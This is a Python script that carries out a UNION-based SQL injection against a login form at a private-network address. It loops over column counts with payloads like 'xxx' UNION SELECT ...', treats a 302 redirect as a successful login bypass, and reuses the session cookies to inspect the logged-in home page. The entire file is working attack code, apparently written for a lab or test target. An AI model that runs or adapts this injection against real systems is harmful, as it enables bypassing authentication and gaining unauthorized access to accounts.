import requests

target = "http://192.168.0.28:3000/login"

# Payload template for UNION SELECT
# We need to guess the number of columns. Let's try 1 to 5.
print("Testing UNION SQLi on Login...")

for i in range(1, 6):
    # Construct '1, 2, 3...' string
    cols = ",".join([f"'{x}'" for x in range(1, i+1)])
    
    # Payload: user doesn't exist, union select static values
    # If successful, the code might log us in as user '2' (if 2 is the username col)
    payload = f"xxx' UNION SELECT {cols} -- "
    
    data = {
        'username': payload,
        'password': 'password'
    }
    
    try:
        res = requests.post(target, data=data, allow_redirects=False) # Don't follow yet
        
        # If we get a 302, it means we logged in successfully (query didn't crash and returned a row)
        if res.status_code == 302:
            print(f"[+] Possible Column Count: {i}")
            print(f"Payload: {payload}")
            print(f"Location: {res.headers.get('Location')}")
            
            # Follow redirect to see who we are
            cookies = res.cookies
            res_home = requests.get("http://192.168.0.28:3000/", cookies=cookies)
            if "Hello" in res_home.text or "Profile" in res_home.text:
                print("-> Logged in successfully via UNION!")
                # Check if any reflected value (1, 2, 3...) appears
                # This helps identify which column is 'username'
                print("Checking for reflected columns in home page...")
                for x in range(1, i+1):
                    if f"'{x}'" in res_home.text or str(x) in res_home.text: # Simple check
                         # A bit noisy, but let's check the username area specifically
                         pass
                # Extract username from profile area
                if "class=\"profile-img\"" in res_home.text:
                    # quick grep logic in python
                    start = res_home.text.find("<h3")
                    end = res_home.text.find("</h3>", start)
                    print(f"Reflected Name Area: {res_home.text[start:end+5]}")
            
            break # Stop after finding first working count
        else:
            print(f"[-] Columns {i}: Failed (Status {res.status_code})")
            
    except Exception as e:
        print(f"Error: {e}")

